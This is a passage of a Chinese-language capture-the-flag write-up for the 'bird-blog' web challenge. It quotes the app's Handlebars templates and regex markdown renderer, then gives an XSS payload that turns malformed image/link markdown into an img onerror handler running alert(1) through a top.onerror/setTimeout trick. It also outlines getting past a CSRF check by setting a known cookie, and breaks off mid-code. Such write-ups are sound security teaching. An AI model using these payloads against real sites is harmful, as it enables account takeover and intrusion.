+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/admin.mjs:145</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">"/comments"</span>, <span class="title function_">async</span> (request, reply) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> comments = <span class="keyword">await</span> <span class="title function_">executeQuery</span>(<span class="string">"admin/getAllComments"</span>);</span><br><span class="line">  <span class="keyword">return</span> reply.<span class="title function_">view</span>(<span class="string">"comments.hbs"</span>, { comments, <span class="attr">blogHost</span>: <span class="variable constant_">BLOG_HOST</span>, <span class="attr">csrfToken</span>: request.<span class="property">csrfToken</span> });</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- bird-blog/app/config-template/hbs/admin/comments.hbs --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Comments<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">th</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">th</span>&gt;</span>Author<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">th</span>&gt;</span>Created At<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">th</span>&gt;</span>Status<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">th</span>&gt;</span>Actions<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	{{#each comments}}</span><br><span class="line">	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">id</span>=<span class="string">"comment-{{this.id}}"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"{{@root.blogHost}}/post/{{this.post.id}}"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>{{this.post.title}}<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>{{this.author}}<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">time</span> <span class="attr">datetime</span>=<span class="string">"{{this.created_at}}"</span>&gt;</span>{{relativeTime this.created_at}}<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>{{#if (isNullish this.approved)}}Pending{{else}}{{#if</span><br><span class="line">			this.approved}}Approved{{else}}Rejected{{/if}}{{/if}}<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"view"</span> <span class="attr">action</span>=<span class="string">"{{@root.blogHost}}/comments/{{this.id}}/view"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">target</span>=<span class="string">"_blank"</span></span></span><br><span class="line"><span class="tag">				<span class="attr">style</span>=<span class="string">"display:inline;"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>View<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">			{{#if (isNullish this.approved)}}</span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"approve"</span> <span class="attr">action</span>=<span class="string">"/comments/{{this.id}}/approve"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">style</span>=<span class="string">"display:inline;"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrfToken"</span> <span class="attr">value</span>=<span class="string">"{{../csrfToken}}"</span> /&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Approve<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"reject"</span> <span class="attr">action</span>=<span class="string">"/comments/{{this.id}}/reject"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">style</span>=<span class="string">"display:inline;"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrfToken"</span> <span class="attr">value</span>=<span class="string">"{{../csrfToken}}"</span> /&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Reject<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">			{{/if}}</span><br><span class="line">		<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	{{/each}}</span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>admin bot 接著會點進還沒被 approved 的留言裡（<code>&lt;form class="view" action="{{@root.blogHost}}/comments/{{this.id}}/view" method="get" target="_blank"&gt;</code>）。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/blog.mjs:148</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">"/comments/:id/view"</span>, <span class="title function_">async</span> (request, reply) =&gt; {</span><br><span class="line">  <span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">const</span> [comment] = <span class="keyword">await</span> <span class="title function_">executeQuery</span>(<span class="string">"blog/getComment"</span>, [request.<span class="property">params</span>.<span class="property">id</span>]);</span><br><span class="line">    <span class="keyword">return</span> reply.<span class="title function_">view</span>(<span class="string">"comment.hbs"</span>, { <span class="attr">pageTitle</span>: <span class="string">`Comment by <span class="subst">${comment.author}</span>`</span>, comment });</span><br><span class="line">  } <span class="keyword">catch</span> (err) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    <span class="keyword">return</span> reply.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">"Internal Server Error"</span>);</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Handlebars"><figure class="iseeu highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- bird-blog/app/config-template/hbs/blog/comment.hbs --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">main</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">	</span><span class="template-variable">{{&gt; <span class="name">comment</span> comment }}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Handlebars"><figure class="iseeu highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- bird-blog/app/config-template/hbs/partials/comment.hbs --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">id</span>=<span class="string">"comment-</span></span></span><span class="template-variable">{{<span class="name">this.id</span>}}</span><span class="language-xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"meta"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">		Posted <span class="tag">&lt;<span class="name">time</span> <span class="attr">datetime</span>=<span class="string">"</span></span></span><span class="template-variable">{{<span class="name">this.created_at</span>}}</span><span class="language-xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">{{<span class="name">relativeTime</span> this.created_at}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">time</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">		by </span><span class="template-variable">{{<span class="name">this.author</span>}}</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><span class="template-variable">{{<span class="name">markdown</span> this.content}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>看到上面使用了 <code>markdown</code> 這個自定義的 handlebars helper（<code>{{markdown this.content}}</code>）。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/helpers/hbs.mjs:73</span></span><br><span class="line">handlebars.<span class="title function_">registerHelper</span>(<span class="string">"markdownPreview"</span>, <span class="keyword">function</span> (<span class="params">content</span>) {</span><br><span class="line">	<span class="keyword">const</span> parts = content.<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">""</span>).<span class="title function_">split</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (parts[<span class="number">0</span>].<span class="title function_">startsWith</span>(<span class="string">"#"</span>)) {</span><br><span class="line">		content = parts.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">2</span>).<span class="title function_">join</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		content = parts[<span class="number">0</span>];</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> handlebars.<span class="title class_">SafeString</span>(<span class="title function_">markdown</span>(content));</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div>
+
+<p>而 <code>markdown</code> 這個 function 長這樣，用了一堆 <code>replace</code></p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/helpers/markdown.mjs</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">markdown</span>(<span class="params">content</span>) {</span><br><span class="line">	<span class="keyword">const</span> paragraphs = content.<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">""</span>).<span class="title function_">split</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> paragraphs.<span class="title function_">map</span>(<span class="function">(<span class="params">paragraph</span>) =&gt;</span> <span class="string">`&lt;p&gt;<span class="subst">${markdownInline(paragraph)}</span>&lt;/p&gt;`</span>).<span class="title function_">join</span>(<span class="string">""</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">markdownInline</span>(<span class="params">content</span>) {</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/[&lt;&gt;&amp;]/g</span>, <span class="function">(<span class="params">char</span>) =&gt;</span> <span class="string">`&amp;#<span class="subst">${char.charCodeAt(<span class="number">0</span>)}</span>;`</span>);</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/[^\x00-\x7F]/ug</span>, <span class="function">(<span class="params">char</span>) =&gt;</span> <span class="string">`&amp;#<span class="subst">${char.codePointAt(<span class="number">0</span>)}</span>;`</span>);</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/(?&lt;!\w)"(?=\w)/g</span>, <span class="string">"&amp;ldquo;"</span>);</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/"/g</span>, <span class="string">"&amp;rdquo;"</span>);</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/(?&lt;!\w)'(?=\w)/g</span>, <span class="string">"&amp;lsquo;"</span>);</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/'/g</span>, <span class="string">"&amp;rsquo;"</span>);</span><br><span class="line"></span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/(__|\*\*)((?:(?!\1).)+?)\1/g</span>, <span class="function">(<span class="params">match, p1, p2</span>) =&gt;</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="string">`&lt;strong&gt;<span class="subst">${p2}</span>&lt;/strong&gt;`</span>;</span><br><span class="line">	});</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/(_|\*)((?:(?!\1).)+?)\1/g</span>, <span class="function">(<span class="params">match, p1, p2</span>) =&gt;</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="string">`&lt;em&gt;<span class="subst">${p2}</span>&lt;/em&gt;`</span>;</span><br><span class="line">	});</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/`([^`]+?)`/g</span>, <span class="function">(<span class="params">match, p1</span>) =&gt;</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="string">`&lt;code&gt;<span class="subst">${p1}</span>&lt;/code&gt;`</span>;</span><br><span class="line">	});</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/~~((?:(?!~~).)+?)~~/g</span>, <span class="function">(<span class="params">match, p1</span>) =&gt;</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="string">`&lt;del&gt;<span class="subst">${p1}</span>&lt;/del&gt;`</span>;</span><br><span class="line">	});</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/!\[([^\]]*)\]\((https?:\/\/[a-zA-Z0-9.-]+(?::\d+)?\/[^)]+)\)/g</span>, <span class="function">(<span class="params">match, alt, url</span>) =&gt;</span> {</span><br><span class="line">		<span class="keyword">try</span> {</span><br><span class="line">			<span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">			<span class="keyword">return</span> <span class="string">`&lt;img src="<span class="subst">${parsedUrl.href}</span>" alt="<span class="subst">${alt}</span>"&gt;`</span>;</span><br><span class="line">		} <span class="keyword">catch</span> {</span><br><span class="line">			<span class="keyword">return</span> match;</span><br><span class="line">		}</span><br><span class="line">	});</span><br><span class="line">	content = content.<span class="title function_">replace</span>(<span class="regexp">/\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9.-]+(?::\d+)?\/[^)]+)\)/g</span>, <span class="function">(<span class="params">match, text, url</span>) =&gt;</span> {</span><br><span class="line">		<span class="keyword">try</span> {</span><br><span class="line">			<span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">			<span class="keyword">return</span> <span class="string">`&lt;a href="<span class="subst">${parsedUrl.href}</span>"&gt;<span class="subst">${text}</span>&lt;/a&gt;`</span>;</span><br><span class="line">		} <span class="keyword">catch</span> {</span><br><span class="line">			<span class="keyword">return</span> match;</span><br><span class="line">		}</span><br><span class="line">	});</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (content.<span class="title function_">startsWith</span>(<span class="string">"#"</span>)) {</span><br><span class="line">		content = content.<span class="title function_">replace</span>(<span class="regexp">/^(#+)\s*(.*)$/</span>, <span class="function">(<span class="params">match, hashes, text</span>) =&gt;</span> {</span><br><span class="line">			<span class="keyword">const</span> level = <span class="number">2</span> + <span class="title class_">Math</span>.<span class="title function_">min</span>(hashes.<span class="property">length</span>, <span class="number">3</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="string">`&lt;h<span class="subst">${level}</span>&gt;<span class="subst">${text}</span>&lt;/h<span class="subst">${level}</span>&gt;`</span>;</span><br><span class="line">		});</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> content;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>如果我們輸入</p>
+<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=alert(1)// ![<span class="string">[x</span>](<span class="link">http://127.0.0.1:9/e?d=</span>)](<span class="link">http://127.0.0.1:9/o/onerror=top.onerror=setTimeout;throw/**/this.parentElement.textContent//</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>經過 <code>markdownInline</code> 後會變這樣：</p>
+<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=alert(1)// <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1:9/e?d="</span> <span class="attr">alt</span>=<span class="string">"&lt;a href="</span><span class="attr">http:</span>//<span class="attr">127.0.0.1:9</span>/<span class="attr">o</span>/<span class="attr">onerror</span>=<span class="string">top.onerror</span>=<span class="string">setTimeout;throw/**/this.parentElement.textContent//</span>"&gt;</span>x"&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>而因為上面的 html 是不合理的，Chrome 會嘗試修復，變成下面這樣：</p>
+<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"overscroll-behavior-x: auto;"</span>&gt;</span>=alert(1)// <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1:9/e?d="</span> <span class="attr">alt</span>=<span class="string">"<span class="symbol">&amp;lt;</span>a href="</span> <span class="attr">http:</span>=<span class="string">""</span> <span class="attr">127.0.0.1:9</span>=<span class="string">""</span> <span class="attr">o</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">"top.onerror=setTimeout;throw/**/this.parentElement.textContent//<span class="symbol">&amp;quot;</span>"</span>&gt;</span>x"<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>img</code> <code>onerror</code> 的內容整理後如下，首先把 <code>top.onerror</code> 覆蓋成 <code>setTimeout</code>。接著直接觸發那個 error，<code>this.parentElement.textContent</code> 在這裡會是 <code>=alert(1)//</code>，他會在前面被加上 <code>Uncaught </code> 之後放到 <code>top.onerror</code> 的第一個參數，第二個參數則是空字串；<code>top.onerror</code> 已經被覆寫成 <code>setTimeout</code> 了，所以相當於 <code>setTimeout("Uncaught =alert(1)", '')</code>，就會執行 <code>alert(1)</code>。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top.<span class="property">onerror</span>=<span class="built_in">setTimeout</span>;</span><br><span class="line"><span class="keyword">throw</span> <span class="variable language_">this</span>.<span class="property">parentElement</span>.<span class="property">textContent</span></span><br></pre></td></tr></table></figure></div>
+
+<p>如果還是看不太清楚的話，我寫了一個把參數印出來的 function，把 <code>top.onerror</code> 覆寫成他來看看參數： </p>
+<p><img src="/def-con-ctf-2026-qual/bird-blog-overwrite-onerror.webp" alt="bird-blog-overwrite-onerror"></p>
+<p>所以我們現在能 XSS admin bot 了。</p>
+<h3 id="Admin-Service"><a href="#Admin-Service" class="headerlink" title="Admin Service"></a>Admin Service</h3><p>XSS admin bot 後，我們就可以用有限制 IP 的 :8081 admin 服務了。<br>:8081 的服務有 CSRF 保護，而我們能 XSS 的地方是 :8080，所以不是 same origin 的，沒辦法直接讀 CSRF token。但因為是同個 domain，所以可以把 :8081 的 CSRF cookie 設成我們已知的來通過 CSRF。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/admin.mjs:45</span></span><br><span class="line">app.<span class="title function_">addHook</span>(<span class="string">"preHandler"</span>, <span class="title function_">async</span> (request, reply) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable constant_">IP_REGEX</span>.<span class="title function_">test</span>(request.<span class="property">ip</span>)) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Blocked request from disallowed IP: <span class="subst">${request.ip}</span>`</span>);</span><br><span class="line">    reply.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>({ <span class="attr">error</span>: <span class="string">`Forbidden; you must access this page from <span class="subst">${ALLOW_PRIVATE_IPS ? <span class="string">"a private IP"</span> : <span class="string">"localhost"</span>}</span>`</span> });</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (request.<span class="property">method</span> === <span class="string">"POST"</span>) {</span><br><span class="line">    <span class="keyword">const</span> csrfSecret = request.<span class="property">cookies</span>.<span class="property">_csrf</span>;</span><br><span class="line">    <span class="keyword">const</span> bodyCsrfToken = request.<span class="property">body</span>?.<span class="property">csrfToken</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (csrfSecret === <span class="literal">undefined</span> || csrfSecret === <span class="string">""</span>) {</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>({ <span class="attr">error</span>: <span class="string">"CSRF secret cookie missing"</span> });</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bodyCsrfToken === <span class="literal">undefined</span>) {</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>({ <span class="attr">error</span>: <span class="string">"CSRF token missing in request body"</span> });</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [csrfSalt, csrfHash] = bodyCsrfToken.<span class="title function_">split</span>(<span class="string">";"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!csrfSalt || !csrfHash) {</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>({ <span class="attr">error</span>: <span class="string">"Invalid CSRF token format"</span> });</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> hash = <span class="title function_">createHash</span>(<span class="string">"sha256"</span>).<span class="title function_">update</span>(csrfSalt + <span class="string">":"</span> + csrfSecret).<span class="title function_">digest</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">timingSafeEqual</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(csrfHash, <span class="string">"hex"</span>), hash)) {</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>({ <span class="attr">error</span>: <span class="string">"Invalid CSRF token"</span> });</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> csrfSecret = request.<span class="property">cookies</span>.<span class="property">_csrf</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!csrfSecret) {</span><br><span class="line">    csrfSecret = <span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">"hex"</span>);</span><br><span class="line">    reply.<span class="title function_">header</span>(<span class="string">"Set-Cookie"</span>, <span class="string">`_csrf=<span class="subst">${csrfSecret}</span>; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600`</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> csrfSalt = <span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">"hex"</span>);</span><br><span class="line">  <span class="keyword">const</span> csrfHash = <span class="title function_">createHash</span>(<span class="string">"sha256"</span>).<span class="title function_">update</span>(csrfSalt + <span class="string">":"</span> + csrfSecret).<span class="title function_">digest</span>(<span class="string">"hex"</span>);</span><br><span class="line">  <span 